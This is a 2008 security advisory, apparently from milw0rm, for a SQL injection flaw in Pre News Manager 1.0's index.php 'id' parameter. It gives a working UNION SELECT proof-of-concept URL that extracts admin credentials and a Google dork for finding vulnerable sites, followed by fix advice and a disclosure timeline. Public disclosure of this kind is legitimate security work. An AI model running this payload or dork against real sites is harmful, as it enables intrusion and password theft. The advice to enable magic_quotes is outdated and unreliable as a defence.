@@ -1,0 +1,88 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_97$2008
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_97$2008] Pre News Manager <= 1.0 (index.php id) Sql Injection Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author         : M.Hasran Addahroni
+Date           : June, 13 th 2008
+Location       : Jakarta, Indonesia
+Web            : http://e-rdc.org/v1/news.php?readmore=97
+Critical Lvl   : Medium
+Impact	       : System access
+Where	       : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : Pre News Manager
+version       : <= 1.0
+Vendor        : http://www.preproject.com/news.asp
+Description   :
+
+Pre News Manager is online news publishing system. Very easy to manage and integration. Powerful online news management system with user friendly control panel. Include news box to any where in your website and integrate news manager in only one step. Upload latest news with images and advertisements. Include  HEADLINES page  to any where in your website and news will automatically updated to that page. Subscribe for latest and breaking news. Submit articles, news latest stories and many more. Add your own news categories. Also can be use for private news website. 
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+
+Input passed to the "id" parameter in index.php page is not properly verified before being used to sql query. 
+This can be exploited thru the browser and get password from admin in plain text.
+Successful exploitation requires that "magic_quotes" is off.
+
+
+Poc/Exploit:
+~~~~~~~~~
+
+http://www.target.com/[path]/index.php?id=-1%20union%20select%201,2,3,concat(login,0x3a,password),5,6,7%20from%20admin--
+
+
+Dork:
+~~~~
+Google    : "To enjoy our newletter please register with us !"
+
+
+Solution:
+~~~~~~
+
+- Edit the source code to ensure that input is properly verified.
+- Turn on magic_quotes in php.ini
+ 
+
+Timeline:
+~~~~~~~~
+
+- 10 - 06 - 2008 bug found
+- 13 - 06 - 2008 vendor contacted
+- 13 - 06 - 2008 advisory released
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~
+~ ping - my dearest wife, zautha my little warrior "happy birthday, dear"
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v,az01,negative,the_hydra,neng chika, str0ke
+~ everybody [at] SCAN-NUSANTARA and SCAN-ASSOSIATES
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,super_temon,b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b
+~ dr188le,SinChan,h4ntu,cow_1seng,poniman_coy,paman_gembul,ketut,rizal,cR4SH3R,kuntua,stev_manado,nofry,k1tk4t,0pt1c
+~ newbie_hacker@yahoogroups.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~~
+
+     K-159 || echo|staff || eufrato[at]gmail[dot]com
+     Homepage: http://www.e-rdc.org/
+
+-------------------------------- [ EOF ] ----------------------------------
+
+# milw0rm.com [2008-06-13]
